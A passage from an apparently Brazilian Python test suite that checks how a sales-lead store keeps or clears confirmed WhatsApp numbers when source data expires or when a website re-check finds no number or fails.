    store.ingest([L("google_places", "ChIJONLY000001", "Só Google", phone="+55 21 99999-0002", city="Rio", uf="RJ")])
    lid = store.page()[0][0]["id"]
    store.set_whatsapp(lid, "confirmado")
    assert store.get(lid)["wa_number"] == "+5521999990002"
    store.con.execute("UPDATE lead_sources SET expires_at='2000-01-01T00:00:00+00:00'"); store.con.commit()
    store.purge_expired()
    d = store.get(lid)
    assert d["wa_number"] == "" and d["wa_status"] != "confirmado" and d["wa_user_number"] == ""   # antes: mantido
    assert "99999-0002" not in str(d["events"])


def test_confirmation_kept_when_another_source_supports_number(store):
    store.ingest([L(phone="19 99900-0001"),
                  L("google_places", "ChIJX0000000001", "Alfa", phone="+55 19 99900-0001")])
    lid = store.page()[0][0]["id"]
    store.set_whatsapp(lid, "confirmado")
    store.con.execute("UPDATE lead_sources SET expires_at='2000-01-01T00:00:00+00:00' WHERE source='google_places'")
    store.con.commit()
    store.purge_expired()
    d = store.get(lid)
    assert (d["wa_number"], d["wa_status"]) == ("+5519999000001", "confirmado")


# ============================================== 18. nova análise de site sem WhatsApp limpa a evidência antiga

def _site(store, lid, numbers):
    store.save_site_check(lid, {"url": "https://alfa-exemplo.com.br/", "ok": True, "summary": "ok",
                                "totals": {}, "terms": {}, "whatsapp_numbers": numbers, "whatsapp_match": ""})


def test_site_without_whatsapp_clears_previous_site_evidence(store):
    store.ingest([L(phone="19 3200-0001", website="https://alfa-exemplo.com.br")])
    lid = store.page()[0][0]["id"]
    _site(store, lid, ["+5519999000001"])
    assert store.get(lid)["wa_status"] == "confirmado"
    _site(store, lid, [])
    d = store.get(lid)
    assert d["wa_number"] != "+5519999000001" and d["wa_status"] != "confirmado"   # antes: mantido
    assert "site" not in d["sources"]


def test_failed_site_check_keeps_previous_evidence_and_manual_confirmation(store):
    store.ingest([L(phone="19 3200-0001", website="https://alfa-exemplo.com.br")])
    lid = store.page()[0][0]["id"]
    _site(store, lid, ["+5519999000001"])
    store.save_site_check(lid, {"url": "x", "ok": False, "summary": "Site inacessível"})
    assert store.get(lid)["wa_number"] == "+5519999000001"
    store.set_whatsapp(lid, "confirmado", "19 3200-0001")
    _site(store, lid, [])
    assert store.get(lid)["wa_number"] == "+551932000001"               # confirmação manual preservada
